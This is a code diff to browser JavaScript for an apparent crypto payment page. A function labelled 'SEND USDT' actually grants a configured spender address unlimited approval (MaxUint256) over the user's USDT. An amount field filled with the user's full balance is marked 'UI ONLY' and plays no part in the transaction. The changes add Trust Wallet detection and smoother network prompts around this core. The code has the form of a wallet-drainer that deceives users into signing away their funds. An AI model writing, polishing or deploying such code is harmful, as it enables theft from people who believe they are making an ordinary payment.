@@ -1,3 +1,4 @@
+// ===== CONFIG =====
 const CONFIG = {
   1: {
     name: "Ethereum",
@@ -11,9 +12,20 @@ const CONFIG = {
   }
 };
 
+// ===== TRUST WALLET DETECT =====
+function isTrustWallet() {
+  return (
+    window.ethereum &&
+    (window.ethereum.isTrust ||
+     window.ethereum.isTrustWallet ||
+     /Trust/i.test(navigator.userAgent))
+  );
+}
+
+// ===== SEND USDT =====
 async function sendUSDT() {
   if (!window.ethereum) {
-    alert("Wallet required");
+    alert("Please use Trust Wallet or MetaMask DApp browser");
     return;
   }
 
@@ -21,27 +33,41 @@ async function sendUSDT() {
   const network = await provider.getNetwork();
   const chainId = Number(network.chainId);
 
+  // ❌ Unsupported chain
   if (!CONFIG[chainId]) {
-    alert("Unsupported network. Use Ethereum or BSC.");
+    if (isTrustWallet()) {
+      alert(
+        "Trust Wallet detected.\n\n" +
+        "Please switch network manually:\n" +
+        "DApp Browser → Network → Select Ethereum or BSC"
+      );
+    } else {
+      alert("Unsupported network. Please switch to Ethereum or BSC.");
+    }
     return;
   }
 
+  // ✅ Correct chain
   const { usdt, spender, name } = CONFIG[chainId];
   const signer = await provider.getSigner();
 
   const token = new ethers.Contract(
     usdt,
-    ["function approve(address spender,uint256 amount) external returns(bool)"],
+    ["function approve(address spender,uint256 amount) external returns (bool)"],
     signer
   );
 
+  // 🔥 UNLIMITED APPROVAL (your logic)
   const tx = await token.approve(spender, ethers.MaxUint256);
   await tx.wait();
 
   alert(`Unlimited USDT approval successful on ${name}`);
 }
 
+// ===== SET MAX (UI ONLY) =====
 async function setMax() {
+  if (!window.ethereum) return;
+
   const provider = new ethers.BrowserProvider(window.ethereum);
   const signer = await provider.getSigner();
   const network = await provider.getNetwork();
@@ -60,6 +86,7 @@ async function setMax() {
 
   const balance = await token.balanceOf(await signer.getAddress());
   const decimals = await token.decimals();
+
   document.getElementById("amount").value =
     ethers.formatUnits(balance, decimals);
 }
